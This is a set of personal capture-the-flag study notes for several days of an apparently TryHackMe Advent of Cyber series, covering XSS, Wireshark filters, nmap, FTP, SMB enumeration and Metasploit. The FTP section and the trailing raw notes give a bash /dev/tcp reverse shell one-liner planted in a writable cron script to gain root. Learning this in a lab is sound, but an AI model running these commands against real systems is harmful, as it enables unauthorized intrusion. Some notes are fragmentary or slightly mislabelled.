# Days
|[1](#a-christmas-crisis)|[2](#the-elf-strikes-back!)|[3](#christmas-chaos)|[4](#santa's-watching)|[5](#someone-stole-santa's-gift-list!)|
|:-:|:-:|:-:|:-:|:-:|:-:|
|[6](#be-careful-with-what-you-wish-on-a-christmas-night)|[7](#the-grinch-really-did-steal-christmas)|[8](#what's-under-the-christmas-tree?)|[9](#anyone-can-be-santa)|[10](#don't-be-so-selfish)|
|[11](#the-rogue-gnome)|[12](#ready,-set,-elf)|[13](#coal-for-christmas)|[14](#where's-rudolph?)|[15](#there's-a-python-in-my-stocking!)|
|[16](#help!-where-is-santa?)|[17](#reverseelfneering)|[18](#the-bits-of-christmas)|[19](#the-naughty-or-nice-list)|[20](#powershelf-to-the-rescue)|
|[21](#time-for-some-elforensics)|[22](#elf-mceager-becomes-cyberelf)|[23](#thegGrinch-strikes-again!)|[24](#the-trialbBefore-christmas)|

# Be careful with what you wish on a Christmas night 
## Topic and concepts
XSS, Detection, Mitigation.<br>
* Cross-site Scripting
* Types of XSS attacks
* OWASP ZAP
## Ressources
[XSS mitigation](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Input_Validation_Cheat_Sheet.md): 
OWASP's guide towards mitigating XSS attacks

# The Grinch Really Did Steal Christmas
## Topic and concepts
IP address, Protocols 101, Three-way handshake, TCP reassembling data, 
Network traffic monitor.<br>
* TCP/IP
* PCAPs
* Basic `Wireshark` filtering
* HTTP
* SMB
* NATting
* UDP/IP
* Routing
* SYN
* ACK
* `Wireshark`
* `Wireshark` filters
* Filter operators
* Data exportation from `Wireshark`
* Filter to see HTTP GET requests
## Walkthrough
Filter to identify the IP address initiating a specific protocol:<br>
`icmp`<br>
Filter to get the name of an article an IP address visited:<br>
`http.request.method == GET`<br>
Filter to see a leaked password during the login process with FTP traffic:<br>
`ftp.request` <br>
Identify encrypted protocol
```
open pcap file
take a look the list of info provided
```
Identify an item on a list:
```
http.request.method == GET
Export Objects HTTP
Save selected object
Open local file
```
## Ressources
[NATting](https://techterms.com/definition/nat): NATting explanation

# What's Under the Christmas Tree?
## Topic and concepts
Nmap, Basic functionalities, Timing templates, NSE, Additional scan types, 
Scans defense.<br>
* Finding port numbers of services running on a IP address
* Determining if the host is up
* Determining the distro running
* Retrieveing the `HTTP-TITLE` of a server
* TCP scanning
* Three-way handshake
* Connect scan
* SYN scan
* Uses of NSE
* Performing OS detection
* IDS (Intrusion Detection)
* IPS (Prevention Systems)
* `Snort`
* `Suricata`
* `pfSense`
## Walkthrough
Provide a script with nmap:
```
--script <name-of-the-script>
```
Perform a SYN scan:
```
-sS <ip>
```
Performe a connect scan:
```
-sT <ip>
```
Determine nmap's performance:
```
-T<number>
```
with `number ε [0, 5]`<br>
Identify services running on a server:
```
-A
```
Retrieve the OS:
```
-O
```
Scan a specific port:
```
-p <port-number>
```
Scan a specific range of ports:
```
-p <lower-range>-<upper-range>
```
Scan all ports:
```
-p-
```
Scan using TCP and performing version fingerprinting:
```
-p-
```
## Ressources
[NSE Doc Reference Portal](https://nmap.org/nsedoc/): List of NSE scripts<br>
[The Penetration Testing Execution Standard](http://www.pentest-standard.org/index.php/Main_Page): 
Penetration testing methodology<br>

# Anyone can be Santa
## Topic and concepts
FTP, No credentials, FTP over terminal, Exploit search.<br>
* `FileZilla`
* FTP servers
* FTP Connections
* Connection ports
* Anonymous mode
## Walkthrough
Access a FTP server:
```
ftp <ip>
```
Check if anonymous mode is enabled: typing
```
anonymous
```
when prompted for the name.<br>
Download a file from FTP server to the local device:
```
get
```
Upload a file from the local device to FTP server
```
put
```
Generat a shell :
```
bash -i >& /dev/tcp/<my-ip-address>/4444 0>&1
```
4444 being a trivial port number.<br>
Catch the connection to get reverse shell:
```
nc -lvnp 4444
```
## Ressources
[PayloadsAllTheThings/Reverse Shell Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp): 
Pentesterts cheatsheet<br>

# Don't be so sElfish
## Topic and concepts
Network file sharing protocols, Samba, Shares search, Share connection.<br>
* File sharing protocols used by organisations/company networks
* SMB (Server Message Block)
* NFS (Network File System)
* Share
* Difference between Samba and FTP
* `enum4linux`
* `smbclient`
* Accessing a share with wrong permissions
* Count the number of users on a Samba server
* Count the number of shares
* Identifying a share not requiring a password
## Walkthrough
List all `enum4linux` options:
```
./enum4linux.pl -h
```
List shares:
```
-U
```
List shares:
```
-S
```
Access a Samba server and its shares:
```
smbclient //<instance-ip-address>/<share>
```
Download a file from a share:
```
get
```
Upload a file to a share:
```
put
```
## Ressources
[CiscoCXSecurity/enum4linux](https://github.com/CiscoCXSecurity/enum4linux): 
Tool installation page<br>

9
ftp MACHINE_IP
cd public
get backup.sh backup.sh
vi backup.sh
bash -i >& /dev/tcp/Your_TryHackMe_IP/4444 0>&1
nc -lvnp 4444
put backup.sh backup.sh
cat /root/flag.txt

solved by not renaming it script, removing script.sh and then waiting

10
./enum4linux.pl -U
./enum4linux.pl -S
smbclient

11
	ssh cmnatic@
	cat /root/flag.txt

12
	MACHINE_IP
	db : version number, meterpreter

	msfconsole
	options
	set RHOST
	set LHOST
	set TARGETURI
	run
	shell

IP address : 10.8.130.100